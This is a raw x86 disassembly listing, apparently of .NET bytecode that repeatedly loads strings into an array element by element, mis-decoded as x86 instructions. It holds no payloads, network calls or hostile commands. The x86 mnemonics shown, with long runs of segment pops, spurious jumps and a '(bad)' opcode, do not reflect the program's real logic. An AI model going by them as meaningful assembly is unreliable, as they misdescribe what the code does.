  40305c:	07                   	pop    %es
  40305d:	1f                   	pop    %ds
  40305e:	10 72 23             	adc    %dh,0x23(%edx)
  403061:	08 00                	or     %al,(%eax)
  403063:	70 a2                	jo     0x403007
  403065:	07                   	pop    %es
  403066:	1f                   	pop    %ds
  403067:	11 72 2d             	adc    %esi,0x2d(%edx)
  40306a:	08 00                	or     %al,(%eax)
  40306c:	70 a2                	jo     0x403010
  40306e:	07                   	pop    %es
  40306f:	1f                   	pop    %ds
  403070:	12 72 37             	adc    0x37(%edx),%dh
  403073:	08 00                	or     %al,(%eax)
  403075:	70 a2                	jo     0x403019
  403077:	07                   	pop    %es
  403078:	1f                   	pop    %ds
  403079:	13 72 3f             	adc    0x3f(%edx),%esi
  40307c:	08 00                	or     %al,(%eax)
  40307e:	70 a2                	jo     0x403022
  403080:	07                   	pop    %es
  403081:	1f                   	pop    %ds
  403082:	14 72                	adc    $0x72,%al
  403084:	49                   	dec    %ecx
  403085:	08 00                	or     %al,(%eax)
  403087:	70 a2                	jo     0x40302b
  403089:	07                   	pop    %es
  40308a:	1f                   	pop    %ds
  40308b:	15 72 53 08 00       	adc    $0x85372,%eax
  403090:	70 a2                	jo     0x403034
  403092:	07                   	pop    %es
  403093:	1f                   	pop    %ds
  403094:	16                   	push   %ss
  403095:	72 5d                	jb     0x4030f4
  403097:	08 00                	or     %al,(%eax)
  403099:	70 a2                	jo     0x40303d
  40309b:	07                   	pop    %es
  40309c:	1f                   	pop    %ds
  40309d:	17                   	pop    %ss
  40309e:	72 67                	jb     0x403107
  4030a0:	08 00                	or     %al,(%eax)
  4030a2:	70 a2                	jo     0x403046
  4030a4:	07                   	pop    %es
  4030a5:	1f                   	pop    %ds
  4030a6:	18 72 73             	sbb    %dh,0x73(%edx)
  4030a9:	08 00                	or     %al,(%eax)
  4030ab:	70 a2                	jo     0x40304f
  4030ad:	07                   	pop    %es
  4030ae:	1f                   	pop    %ds
  4030af:	19 72 7f             	sbb    %esi,0x7f(%edx)
  4030b2:	08 00                	or     %al,(%eax)
  4030b4:	70 a2                	jo     0x403058
  4030b6:	07                   	pop    %es
  4030b7:	1f                   	pop    %ds
  4030b8:	1a 72 89             	sbb    -0x77(%edx),%dh
  4030bb:	08 00                	or     %al,(%eax)
  4030bd:	70 a2                	jo     0x403061
  4030bf:	07                   	pop    %es
  4030c0:	1f                   	pop    %ds
  4030c1:	1b 72 93             	sbb    -0x6d(%edx),%esi
  4030c4:	08 00                	or     %al,(%eax)
  4030c6:	70 a2                	jo     0x40306a
  4030c8:	07                   	pop    %es
  4030c9:	1f                   	pop    %ds
  4030ca:	1c 72                	sbb    $0x72,%al
  4030cc:	9d                   	popf
  4030cd:	08 00                	or     %al,(%eax)
  4030cf:	70 a2                	jo     0x403073
  4030d1:	07                   	pop    %es
  4030d2:	1f                   	pop    %ds
  4030d3:	1d 72 a7 08 00       	sbb    $0x8a772,%eax
  4030d8:	70 a2                	jo     0x40307c
  4030da:	07                   	pop    %es
  4030db:	1f                   	pop    %ds
  4030dc:	1e                   	push   %ds
  4030dd:	72 b1                	jb     0x403090
  4030df:	08 00                	or     %al,(%eax)
  4030e1:	70 a2                	jo     0x403085
  4030e3:	07                   	pop    %es
  4030e4:	1f                   	pop    %ds
  4030e5:	1f                   	pop    %ds
  4030e6:	72 bb                	jb     0x4030a3
  4030e8:	08 00                	or     %al,(%eax)
  4030ea:	70 a2                	jo     0x40308e
  4030ec:	07                   	pop    %es
  4030ed:	1f                   	pop    %ds
  4030ee:	20 72 c5             	and    %dh,-0x3b(%edx)
  4030f1:	08 00                	or     %al,(%eax)
  4030f3:	70 a2                	jo     0x403097
  4030f5:	07                   	pop    %es
  4030f6:	1f                   	pop    %ds
  4030f7:	21 72 d1             	and    %esi,-0x2f(%edx)
  4030fa:	08 00                	or     %al,(%eax)
  4030fc:	70 a2                	jo     0x4030a0
  4030fe:	07                   	pop    %es
  4030ff:	1f                   	pop    %ds
  403100:	22 72 d9             	and    -0x27(%edx),%dh
  403103:	08 00                	or     %al,(%eax)
  403105:	70 a2                	jo     0x4030a9
  403107:	07                   	pop    %es
  403108:	1f                   	pop    %ds
  403109:	23 72 e3             	and    -0x1d(%edx),%esi
  40310c:	08 00                	or     %al,(%eax)
  40310e:	70 a2                	jo     0x4030b2
  403110:	07                   	pop    %es
  403111:	1f                   	pop    %ds
  403112:	24 72                	and    $0x72,%al
  403114:	ed                   	in     (%dx),%eax
  403115:	08 00                	or     %al,(%eax)
  403117:	70 a2                	jo     0x4030bb
  403119:	07                   	pop    %es
  40311a:	1f                   	pop    %ds
  40311b:	25 72 f7 08 00       	and    $0x8f772,%eax
  403120:	70 a2                	jo     0x4030c4
  403122:	07                   	pop    %es
  403123:	1f                   	pop    %ds
  403124:	26 72 01             	es jb  0x403128
  403127:	09 00                	or     %eax,(%eax)
  403129:	70 a2                	jo     0x4030cd
  40312b:	07                   	pop    %es
  40312c:	1f                   	pop    %ds
  40312d:	27                   	daa
  40312e:	72 0b                	jb     0x40313b
  403130:	09 00                	or     %eax,(%eax)
  403132:	70 a2                	jo     0x4030d6
  403134:	07                   	pop    %es
  403135:	1f                   	pop    %ds
  403136:	28 72 15             	sub    %dh,0x15(%edx)
  403139:	09 00                	or     %eax,(%eax)
  40313b:	70 a2                	jo     0x4030df
  40313d:	07                   	pop    %es
  40313e:	1f                   	pop    %ds
  40313f:	29 72 1f             	sub    %esi,0x1f(%edx)
  403142:	09 00                	or     %eax,(%eax)
  403144:	70 a2                	jo     0x4030e8
  403146:	07                   	pop    %es
  403147:	1f                   	pop    %ds
  403148:	2a 72 29             	sub    0x29(%edx),%dh
  40314b:	09 00                	or     %eax,(%eax)
  40314d:	70 a2                	jo     0x4030f1
  40314f:	07                   	pop    %es
  403150:	1f                   	pop    %ds
  403151:	2b 72 33             	sub    0x33(%edx),%esi
  403154:	09 00                	or     %eax,(%eax)
  403156:	70 a2                	jo     0x4030fa
  403158:	07                   	pop    %es
  403159:	1f                   	pop    %ds
  40315a:	2c 72                	sub    $0x72,%al
  40315c:	3d 09 00 70 a2       	cmp    $0xa2700009,%eax
  403161:	07                   	pop    %es
  403162:	1f                   	pop    %ds
  403163:	2d 72 47 09 00       	sub    $0x94772,%eax
  403168:	70 a2                	jo     0x40310c
  40316a:	07                   	pop    %es
  40316b:	1f                   	pop    %ds
  40316c:	2e 72 51             	jb,pn  0x4031c0
  40316f:	09 00                	or     %eax,(%eax)
  403171:	70 a2                	jo     0x403115
  403173:	07                   	pop    %es
  403174:	1f                   	pop    %ds
  403175:	2f                   	das
  403176:	72 5b                	jb     0x4031d3
  403178:	09 00                	or     %eax,(%eax)
  40317a:	70 a2                	jo     0x40311e
  40317c:	07                   	pop    %es
  40317d:	1f                   	pop    %ds
  40317e:	30 72 65             	xor    %dh,0x65(%edx)
  403181:	09 00                	or     %eax,(%eax)
  403183:	70 a2                	jo     0x403127
  403185:	07                   	pop    %es
  403186:	1f                   	pop    %ds
  403187:	31 72 6f             	xor    %esi,0x6f(%edx)
  40318a:	09 00                	or     %eax,(%eax)
  40318c:	70 a2                	jo     0x403130
  40318e:	07                   	pop    %es
  40318f:	1f                   	pop    %ds
  403190:	32 72 7b             	xor    0x7b(%edx),%dh
  403193:	09 00                	or     %eax,(%eax)
  403195:	70 a2                	jo     0x403139
  403197:	07                   	pop    %es
  403198:	1f                   	pop    %ds
  403199:	33 72 85             	xor    -0x7b(%edx),%esi
  40319c:	09 00                	or     %eax,(%eax)
  40319e:	70 a2                	jo     0x403142
  4031a0:	07                   	pop    %es
  4031a1:	1f                   	pop    %ds
  4031a2:	34 72                	xor    $0x72,%al
  4031a4:	91                   	xchg   %eax,%ecx
  4031a5:	09 00                	or     %eax,(%eax)
  4031a7:	70 a2                	jo     0x40314b
  4031a9:	07                   	pop    %es
  4031aa:	1f                   	pop    %ds
  4031ab:	35 72 9b 09 00       	xor    $0x99b72,%eax
  4031b0:	70 a2                	jo     0x403154
  4031b2:	07                   	pop    %es
  4031b3:	1f                   	pop    %ds
  4031b4:	36 72 a5             	ss jb  0x40315c
  4031b7:	09 00                	or     %eax,(%eax)
  4031b9:	70 a2                	jo     0x40315d
  4031bb:	07                   	pop    %es
  4031bc:	1f                   	pop    %ds
  4031bd:	37                   	aaa
  4031be:	72 af                	jb     0x40316f
  4031c0:	09 00                	or     %eax,(%eax)
  4031c2:	70 a2                	jo     0x403166
  4031c4:	07                   	pop    %es
  4031c5:	1f                   	pop    %ds
  4031c6:	38 72 b9             	cmp    %dh,-0x47(%edx)
  4031c9:	09 00                	or     %eax,(%eax)
  4031cb:	70 a2                	jo     0x40316f
  4031cd:	07                   	pop    %es
  4031ce:	1f                   	pop    %ds
  4031cf:	39 72 c5             	cmp    %esi,-0x3b(%edx)
  4031d2:	09 00                	or     %eax,(%eax)
  4031d4:	70 a2                	jo     0x403178
  4031d6:	07                   	pop    %es
  4031d7:	1f                   	pop    %ds
  4031d8:	3a 72 cf             	cmp    -0x31(%edx),%dh
  4031db:	09 00                	or     %eax,(%eax)
  4031dd:	70 a2                	jo     0x403181
  4031df:	07                   	pop    %es
  4031e0:	1f                   	pop    %ds
  4031e1:	3b 72 d9             	cmp    -0x27(%edx),%esi
  4031e4:	09 00                	or     %eax,(%eax)
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	07                   	pop    %es
  4031e9:	1f                   	pop    %ds
  4031ea:	3c 72                	cmp    $0x72,%al
  4031ec:	e5 09                	in     $0x9,%eax
  4031ee:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031f1:	07                   	pop    %es
  4031f2:	1f                   	pop    %ds
  4031f3:	3d 72 ed 09 00       	cmp    $0x9ed72,%eax
  4031f8:	70 a2                	jo     0x40319c
  4031fa:	07                   	pop    %es
  4031fb:	1f                   	pop    %ds
  4031fc:	3e 72 f9             	jb,pt  0x4031f8
  4031ff:	09 00                	or     %eax,(%eax)
  403201:	70 a2                	jo     0x4031a5
  403203:	07                   	pop    %es
  403204:	1f                   	pop    %ds
  403205:	3f                   	aas
  403206:	72 0b                	jb     0x403213
  403208:	0a 00                	or     (%eax),%al
  40320a:	70 a2                	jo     0x4031ae
  40320c:	07                   	pop    %es
  40320d:	1f                   	pop    %ds
  40320e:	40                   	inc    %eax
  40320f:	72 15                	jb     0x403226
  403211:	0a 00                	or     (%eax),%al
  403213:	70 a2                	jo     0x4031b7
  403215:	07                   	pop    %es
  403216:	1f                   	pop    %ds
  403217:	41                   	inc    %ecx
  403218:	72 21                	jb     0x40323b
  40321a:	0a 00                	or     (%eax),%al
  40321c:	70 a2                	jo     0x4031c0
  40321e:	07                   	pop    %es
  40321f:	1f                   	pop    %ds
  403220:	42                   	inc    %edx
  403221:	72 2b                	jb     0x40324e
  403223:	0a 00                	or     (%eax),%al
  403225:	70 a2                	jo     0x4031c9
  403227:	07                   	pop    %es
  403228:	1f                   	pop    %ds
  403229:	43                   	inc    %ebx
  40322a:	72 35                	jb     0x403261
  40322c:	0a 00                	or     (%eax),%al
  40322e:	70 a2                	jo     0x4031d2
  403230:	07                   	pop    %es
  403231:	1f                   	pop    %ds
  403232:	44                   	inc    %esp
  403233:	72 3f                	jb     0x403274
  403235:	0a 00                	or     (%eax),%al
  403237:	70 a2                	jo     0x4031db
  403239:	07                   	pop    %es
  40323a:	1f                   	pop    %ds
  40323b:	45                   	inc    %ebp
  40323c:	72 47                	jb     0x403285
  40323e:	0a 00                	or     (%eax),%al
  403240:	70 a2                	jo     0x4031e4
  403242:	07                   	pop    %es
  403243:	1f                   	pop    %ds
  403244:	46                   	inc    %esi
  403245:	72 51                	jb     0x403298
  403247:	0a 00                	or     (%eax),%al
  403249:	70 a2                	jo     0x4031ed
  40324b:	07                   	pop    %es
  40324c:	1f                   	pop    %ds
  40324d:	47                   	inc    %edi
  40324e:	72 5b                	jb     0x4032ab
  403250:	0a 00                	or     (%eax),%al
  403252:	70 a2                	jo     0x4031f6
  403254:	07                   	pop    %es
  403255:	1f                   	pop    %ds
  403256:	48                   	dec    %eax
  403257:	72 65                	jb     0x4032be
  403259:	0a 00                	or     (%eax),%al
  40325b:	70 a2                	jo     0x4031ff
  40325d:	07                   	pop    %es
  40325e:	1f                   	pop    %ds
  40325f:	49                   	dec    %ecx
  403260:	72 6f                	jb     0x4032d1
  403262:	0a 00                	or     (%eax),%al
  403264:	70 a2                	jo     0x403208
  403266:	07                   	pop    %es
  403267:	1f                   	pop    %ds
  403268:	4a                   	dec    %edx
  403269:	72 7f                	jb     0x4032ea
  40326b:	0a 00                	or     (%eax),%al
  40326d:	70 a2                	jo     0x403211
  40326f:	07                   	pop    %es
  403270:	1f                   	pop    %ds
  403271:	4b                   	dec    %ebx
  403272:	72 8d                	jb     0x403201
  403274:	0a 00                	or     (%eax),%al
  403276:	70 a2                	jo     0x40321a
  403278:	07                   	pop    %es
  403279:	1f                   	pop    %ds
  40327a:	4c                   	dec    %esp
  40327b:	72 97                	jb     0x403214
  40327d:	0a 00                	or     (%eax),%al
  40327f:	70 a2                	jo     0x403223
  403281:	07                   	pop    %es
  403282:	1f                   	pop    %ds
  403283:	4d                   	dec    %ebp
  403284:	72 a1                	jb     0x403227
  403286:	0a 00                	or     (%eax),%al
  403288:	70 a2                	jo     0x40322c
  40328a:	07                   	pop    %es
  40328b:	1f                   	pop    %ds
  40328c:	4e                   	dec    %esi
  40328d:	72 ad                	jb     0x40323c
  40328f:	0a 00                	or     (%eax),%al
  403291:	70 a2                	jo     0x403235
  403293:	07                   	pop    %es
  403294:	1f                   	pop    %ds
  403295:	4f                   	dec    %edi
  403296:	72 b7                	jb     0x40324f
  403298:	0a 00                	or     (%eax),%al
  40329a:	70 a2                	jo     0x40323e
  40329c:	07                   	pop    %es
  40329d:	1f                   	pop    %ds
  40329e:	50                   	push   %eax
  40329f:	72 c1                	jb     0x403262
  4032a1:	0a 00                	or     (%eax),%al
  4032a3:	70 a2                	jo     0x403247
  4032a5:	07                   	pop    %es
  4032a6:	1f                   	pop    %ds
  4032a7:	51                   	push   %ecx
  4032a8:	72 cb                	jb     0x403275
  4032aa:	0a 00                	or     (%eax),%al
  4032ac:	70 a2                	jo     0x403250
  4032ae:	07                   	pop    %es
  4032af:	1f                   	pop    %ds
  4032b0:	52                   	push   %edx
  4032b1:	72 d5                	jb     0x403288
  4032b3:	0a 00                	or     (%eax),%al
  4032b5:	70 a2                	jo     0x403259
  4032b7:	07                   	pop    %es
  4032b8:	1f                   	pop    %ds
  4032b9:	53                   	push   %ebx
  4032ba:	72 df                	jb     0x40329b
  4032bc:	0a 00                	or     (%eax),%al
  4032be:	70 a2                	jo     0x403262
  4032c0:	07                   	pop    %es
  4032c1:	1f                   	pop    %ds
  4032c2:	54                   	push   %esp
  4032c3:	72 e9                	jb     0x4032ae
  4032c5:	0a 00                	or     (%eax),%al
  4032c7:	70 a2                	jo     0x40326b
  4032c9:	07                   	pop    %es
  4032ca:	1f                   	pop    %ds
  4032cb:	55                   	push   %ebp
  4032cc:	72 f3                	jb     0x4032c1
  4032ce:	0a 00                	or     (%eax),%al
  4032d0:	70 a2                	jo     0x403274
  4032d2:	07                   	pop    %es
  4032d3:	1f                   	pop    %ds
  4032d4:	56                   	push   %esi
  4032d5:	72 01                	jb     0x4032d8
  4032d7:	0b 00                	or     (%eax),%eax
  4032d9:	70 a2                	jo     0x40327d
  4032db:	07                   	pop    %es
  4032dc:	1f                   	pop    %ds
  4032dd:	57                   	push   %edi
  4032de:	72 11                	jb     0x4032f1
  4032e0:	0b 00                	or     (%eax),%eax
  4032e2:	70 a2                	jo     0x403286
  4032e4:	07                   	pop    %es
  4032e5:	1f                   	pop    %ds
  4032e6:	58                   	pop    %eax
  4032e7:	72 1b                	jb     0x403304
  4032e9:	0b 00                	or     (%eax),%eax
  4032eb:	70 a2                	jo     0x40328f
  4032ed:	07                   	pop    %es
  4032ee:	1f                   	pop    %ds
  4032ef:	59                   	pop    %ecx
  4032f0:	72 23                	jb     0x403315
  4032f2:	0b 00                	or     (%eax),%eax
  4032f4:	70 a2                	jo     0x403298
  4032f6:	07                   	pop    %es
  4032f7:	1f                   	pop    %ds
  4032f8:	5a                   	pop    %edx
  4032f9:	72 2b                	jb     0x403326
  4032fb:	0b 00                	or     (%eax),%eax
  4032fd:	70 a2                	jo     0x4032a1
  4032ff:	07                   	pop    %es
  403300:	1f                   	pop    %ds
  403301:	5b                   	pop    %ebx
  403302:	72 35                	jb     0x403339
  403304:	0b 00                	or     (%eax),%eax
  403306:	70 a2                	jo     0x4032aa
  403308:	07                   	pop    %es
  403309:	1f                   	pop    %ds
  40330a:	5c                   	pop    %esp
  40330b:	72 41                	jb     0x40334e
  40330d:	0b 00                	or     (%eax),%eax
  40330f:	70 a2                	jo     0x4032b3
  403311:	07                   	pop    %es
  403312:	1f                   	pop    %ds
  403313:	5d                   	pop    %ebp
  403314:	72 4d                	jb     0x403363
  403316:	0b 00                	or     (%eax),%eax
  403318:	70 a2                	jo     0x4032bc
  40331a:	07                   	pop    %es
  40331b:	1f                   	pop    %ds
  40331c:	5e                   	pop    %esi
  40331d:	72 55                	jb     0x403374
  40331f:	0b 00                	or     (%eax),%eax
  403321:	70 a2                	jo     0x4032c5
  403323:	07                   	pop    %es
  403324:	1f                   	pop    %ds
  403325:	5f                   	pop    %edi
  403326:	72 5f                	jb     0x403387
  403328:	0b 00                	or     (%eax),%eax
  40332a:	70 a2                	jo     0x4032ce
  40332c:	07                   	pop    %es
  40332d:	1f                   	pop    %ds
  40332e:	60                   	pusha
  40332f:	72 6b                	jb     0x40339c
  403331:	0b 00                	or     (%eax),%eax
  403333:	70 a2                	jo     0x4032d7
  403335:	07                   	pop    %es
  403336:	1f                   	pop    %ds
  403337:	61                   	popa
  403338:	72 75                	jb     0x4033af
  40333a:	0b 00                	or     (%eax),%eax
  40333c:	70 a2                	jo     0x4032e0
  40333e:	07                   	pop    %es
  40333f:	1f                   	pop    %ds
  403340:	62 72 7f             	bound  %esi,0x7f(%edx)
  403343:	0b 00                	or     (%eax),%eax
  403345:	70 a2                	jo     0x4032e9
  403347:	07                   	pop    %es
  403348:	1f                   	pop    %ds
  403349:	63 72 8b             	arpl   %esi,-0x75(%edx)
  40334c:	0b 00                	or     (%eax),%eax
  40334e:	70 a2                	jo     0x4032f2
  403350:	07                   	pop    %es
  403351:	1f                   	pop    %ds
  403352:	64 72 95             	fs jb  0x4032ea
  403355:	0b 00                	or     (%eax),%eax
  403357:	70 a2                	jo     0x4032fb
  403359:	07                   	pop    %es
  40335a:	1f                   	pop    %ds
  40335b:	65 72 a1             	gs jb  0x4032ff
  40335e:	0b 00                	or     (%eax),%eax
  403360:	70 a2                	jo     0x403304
  403362:	07                   	pop    %es
  403363:	1f                   	pop    %ds
  403364:	66 72 ab             	data16 jb 0x403312
  403367:	0b 00                	or     (%eax),%eax
  403369:	70 a2                	jo     0x40330d
  40336b:	07                   	pop    %es
  40336c:	1f                   	pop    %ds
  40336d:	67 72 b5             	addr16 jb 0x403325
  403370:	0b 00                	or     (%eax),%eax
  403372:	70 a2                	jo     0x403316
  403374:	07                   	pop    %es
  403375:	1f                   	pop    %ds
  403376:	68 72 c1 0b 00       	push   $0xbc172
  40337b:	70 a2                	jo     0x40331f
  40337d:	07                   	pop    %es
  40337e:	1f                   	pop    %ds
  40337f:	69 72 cb 0b 00 70 a2 	imul   $0xa270000b,-0x35(%edx),%esi
  403386:	07                   	pop    %es
  403387:	1f                   	pop    %ds
  403388:	6a 72                	push   $0x72
  40338a:	d5 0b                	aad    $0xb
  40338c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40338f:	07                   	pop    %es
  403390:	1f                   	pop    %ds
  403391:	6b 72 df 0b          	imul   $0xb,-0x21(%edx),%esi
  403395:	00 70 a2             	add    %dh,-0x5e(%eax)
  403398:	07                   	pop    %es
  403399:	1f                   	pop    %ds
  40339a:	6c                   	insb   (%dx),%es:(%edi)
  40339b:	72 e9                	jb     0x403386
  40339d:	0b 00                	or     (%eax),%eax
  40339f:	70 a2                	jo     0x403343
  4033a1:	07                   	pop    %es
  4033a2:	1f                   	pop    %ds
  4033a3:	6d                   	insl   (%dx),%es:(%edi)
  4033a4:	72 f3                	jb     0x403399
  4033a6:	0b 00                	or     (%eax),%eax
  4033a8:	70 a2                	jo     0x40334c
  4033aa:	07                   	pop    %es
  4033ab:	1f                   	pop    %ds
  4033ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4033ad:	72 fb                	jb     0x4033aa
  4033af:	0b 00                	or     (%eax),%eax
  4033b1:	70 a2                	jo     0x403355
  4033b3:	07                   	pop    %es
  4033b4:	1f                   	pop    %ds
  4033b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4033b6:	72 05                	jb     0x4033bd
  4033b8:	0c 00                	or     $0x0,%al
  4033ba:	70 a2                	jo     0x40335e
  4033bc:	07                   	pop    %es
  4033bd:	1f                   	pop    %ds
  4033be:	70 72                	jo     0x403432
  4033c0:	11 0c 00             	adc    %ecx,(%eax,%eax,1)
  4033c3:	70 a2                	jo     0x403367
  4033c5:	07                   	pop    %es
  4033c6:	1f                   	pop    %ds
  4033c7:	71 72                	jno    0x40343b
  4033c9:	21 0c 00             	and    %ecx,(%eax,%eax,1)
  4033cc:	70 a2                	jo     0x403370
  4033ce:	07                   	pop    %es
  4033cf:	1f                   	pop    %ds
  4033d0:	72 72                	jb     0x403444
  4033d2:	2f                   	das
  4033d3:	0c 00                	or     $0x0,%al
  4033d5:	70 a2                	jo     0x403379
  4033d7:	07                   	pop    %es
  4033d8:	1f                   	pop    %ds
  4033d9:	73 72                	jae    0x40344d
  4033db:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4033de:	70 a2                	jo     0x403382
  4033e0:	07                   	pop    %es
  4033e1:	1f                   	pop    %ds
  4033e2:	74 72                	je     0x403456
  4033e4:	45                   	inc    %ebp
  4033e5:	0c 00                	or     $0x0,%al
  4033e7:	70 a2                	jo     0x40338b
  4033e9:	07                   	pop    %es
  4033ea:	1f                   	pop    %ds
  4033eb:	75 72                	jne    0x40345f
  4033ed:	4f                   	dec    %edi
  4033ee:	0c 00                	or     $0x0,%al
  4033f0:	70 a2                	jo     0x403394
  4033f2:	07                   	pop    %es
  4033f3:	1f                   	pop    %ds
  4033f4:	76 72                	jbe    0x403468
  4033f6:	59                   	pop    %ecx
  4033f7:	0c 00                	or     $0x0,%al
  4033f9:	70 a2                	jo     0x40339d
  4033fb:	07                   	pop    %es
  4033fc:	1f                   	pop    %ds
  4033fd:	77 72                	ja     0x403471
  4033ff:	61                   	popa
  403400:	0c 00                	or     $0x0,%al
  403402:	70 a2                	jo     0x4033a6
  403404:	07                   	pop    %es
  403405:	1f                   	pop    %ds
  403406:	78 72                	js     0x40347a
  403408:	71 0c                	jno    0x403416
  40340a:	00 70 a2             	add    %dh,-0x5e(%eax)
  40340d:	07                   	pop    %es
  40340e:	1f                   	pop    %ds
  40340f:	79 72                	jns    0x403483
  403411:	79 0c                	jns    0x40341f
  403413:	00 70 a2             	add    %dh,-0x5e(%eax)
  403416:	07                   	pop    %es
  403417:	1f                   	pop    %ds
  403418:	7a 72                	jp     0x40348c
  40341a:	83 0c 00 70          	orl    $0x70,(%eax,%eax,1)
  40341e:	a2 07 1f 7b 72       	mov    %al,0x727b1f07
  403423:	8d 0c 00             	lea    (%eax,%eax,1),%ecx
  403426:	70 a2                	jo     0x4033ca
  403428:	07                   	pop    %es
  403429:	1f                   	pop    %ds
  40342a:	7c 72                	jl     0x40349e
  40342c:	97                   	xchg   %eax,%edi
  40342d:	0c 00                	or     $0x0,%al
  40342f:	70 a2                	jo     0x4033d3
  403431:	07                   	pop    %es
  403432:	1f                   	pop    %ds
  403433:	7d 72                	jge    0x4034a7
  403435:	a1 0c 00 70 a2       	mov    0xa270000c,%eax
  40343a:	07                   	pop    %es
  40343b:	1f                   	pop    %ds
  40343c:	7e 72                	jle    0x4034b0
  40343e:	ad                   	lods   %ds:(%esi),%eax
  40343f:	0c 00                	or     $0x0,%al
  403441:	70 a2                	jo     0x4033e5
  403443:	07                   	pop    %es
  403444:	1f                   	pop    %ds
  403445:	7f 72                	jg     0x4034b9
  403447:	b9 0c 00 70 a2       	mov    $0xa270000c,%ecx
  40344c:	07                   	pop    %es
  40344d:	20 80 00 00 00 72    	and    %al,0x72000000(%eax)
  403453:	c3                   	ret
  403454:	0c 00                	or     $0x0,%al
  403456:	70 a2                	jo     0x4033fa
  403458:	07                   	pop    %es
  403459:	20 81 00 00 00 72    	and    %al,0x72000000(%ecx)
  40345f:	cd 0c                	int    $0xc
  403461:	00 70 a2             	add    %dh,-0x5e(%eax)
  403464:	07                   	pop    %es
  403465:	20 82 00 00 00 72    	and    %al,0x72000000(%edx)
  40346b:	d7                   	xlat   %ds:(%ebx)
  40346c:	0c 00                	or     $0x0,%al
  40346e:	70 a2                	jo     0x403412
  403470:	07                   	pop    %es
  403471:	20 83 00 00 00 72    	and    %al,0x72000000(%ebx)
  403477:	e1 0c                	loope  0x403485
  403479:	00 70 a2             	add    %dh,-0x5e(%eax)
  40347c:	07                   	pop    %es
  40347d:	20 84 00 00 00 72 eb 	and    %al,-0x148e0000(%eax,%eax,1)
  403484:	0c 00                	or     $0x0,%al
  403486:	70 a2                	jo     0x40342a
  403488:	07                   	pop    %es
  403489:	20 85 00 00 00 72    	and    %al,0x72000000(%ebp)
  40348f:	f5                   	cmc
  403490:	0c 00                	or     $0x0,%al
  403492:	70 a2                	jo     0x403436
  403494:	07                   	pop    %es
  403495:	20 86 00 00 00 72    	and    %al,0x72000000(%esi)
  40349b:	01 0d 00 70 a2 07    	add    %ecx,0x7a27000
  4034a1:	20 87 00 00 00 72    	and    %al,0x72000000(%edi)
  4034a7:	0d 0d 00 70 a2       	or     $0xa270000d,%eax
  4034ac:	07                   	pop    %es
  4034ad:	20 88 00 00 00 72    	and    %cl,0x72000000(%eax)
  4034b3:	19 0d 00 70 a2 07    	sbb    %ecx,0x7a27000
  4034b9:	20 89 00 00 00 72    	and    %cl,0x72000000(%ecx)
  4034bf:	25 0d 00 70 a2       	and    $0xa270000d,%eax
  4034c4:	07                   	pop    %es
  4034c5:	20 8a 00 00 00 72    	and    %cl,0x72000000(%edx)
  4034cb:	31 0d 00 70 a2 07    	xor    %ecx,0x7a27000
  4034d1:	20 8b 00 00 00 72    	and    %cl,0x72000000(%ebx)
  4034d7:	3b 0d 00 70 a2 07    	cmp    0x7a27000,%ecx
  4034dd:	20 8c 00 00 00 72 45 	and    %cl,0x45720000(%eax,%eax,1)
  4034e4:	0d 00 70 a2 07       	or     $0x7a27000,%eax
  4034e9:	20 8d 00 00 00 72    	and    %cl,0x72000000(%ebp)
  4034ef:	4f                   	dec    %edi
  4034f0:	0d 00 70 a2 07       	or     $0x7a27000,%eax
  4034f5:	20 8e 00 00 00 72    	and    %cl,0x72000000(%esi)
  4034fb:	59                   	pop    %ecx
  4034fc:	0d 00 70 a2 07       	or     $0x7a27000,%eax
  403501:	20 8f 00 00 00 72    	and    %cl,0x72000000(%edi)
  403507:	63 0d 00 70 a2 07    	arpl   %ecx,0x7a27000
  40350d:	20 90 00 00 00 72    	and    %dl,0x72000000(%eax)
  403513:	6d                   	insl   (%dx),%es:(%edi)
  403514:	0d 00 70 a2 07       	or     $0x7a27000,%eax
  403519:	20 91 00 00 00 72    	and    %dl,0x72000000(%ecx)
  40351f:	77 0d                	ja     0x40352e
  403521:	00 70 a2             	add    %dh,-0x5e(%eax)
  403524:	07                   	pop    %es
  403525:	20 92 00 00 00 72    	and    %dl,0x72000000(%edx)
  40352b:	85 0d 00 70 a2 07    	test   %ecx,0x7a27000
  403531:	20 93 00 00 00 72    	and    %dl,0x72000000(%ebx)
  403537:	8f                   	(bad)
  403538:	0d 00 70 a2 07       	or     $0x7a27000,%eax
  40353d:	20 94 00 00 00 72 9d 	and    %dl,-0x628e0000(%eax,%eax,1)
  403544:	0d 00 70 a2 07       	or     $0x7a27000,%eax
  403549:	20 95 00 00 00 72    	and    %dl,0x72000000(%ebp)
  40354f:	a9 0d 00 70 a2       	test   $0xa270000d,%eax
  403554:	07                   	pop    %es
  403555:	20 96 00 00 00 72    	and    %dl,0x72000000(%esi)
  40355b:	b3 0d                	mov    $0xd,%bl
  40355d:	00 70 a2             	add    %dh,-0x5e(%eax)
  403560:	07                   	pop    %es
  403561:	20 97 00 00 00 72    	and    %dl,0x72000000(%edi)
  403567:	bf 0d 00 70 a2       	mov    $0xa270000d,%edi
  40356c:	07                   	pop    %es
  40356d:	20 98 00 00 00 72    	and    %bl,0x72000000(%eax)
  403573:	c9                   	leave
  403574:	0d 00 70 a2 07       	or     $0x7a27000,%eax
  403579:	20 99 00 00 00 72    	and    %bl,0x72000000(%ecx)
  40357f:	d3 0d 00 70 a2 07    	rorl   %cl,0x7a27000
  403585:	20 9a 00 00 00 72    	and    %bl,0x72000000(%edx)
  40358b:	dd 0d 00 70 a2 07    	fisttpll 0x7a27000
  403591:	20 9b 00 00 00 72    	and    %bl,0x72000000(%ebx)
  403597:	e7 0d                	out    %eax,$0xd
  403599:	00 70 a2             	add    %dh,-0x5e(%eax)
  40359c:	07                   	pop    %es
  40359d:	20 9c 00 00 00 72 f5 	and    %bl,-0xa8e0000(%eax,%eax,1)
  4035a4:	0d 00 70 a2 07       	or     $0x7a27000,%eax
  4035a9:	20 9d 00 00 00 72    	and    %bl,0x72000000(%ebp)
  4035af:	03 0e                	add    (%esi),%ecx
  4035b1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035b4:	07                   	pop    %es
  4035b5:	20 9e 00 00 00 72    	and    %bl,0x72000000(%esi)
  4035bb:	11 0e                	adc    %ecx,(%esi)
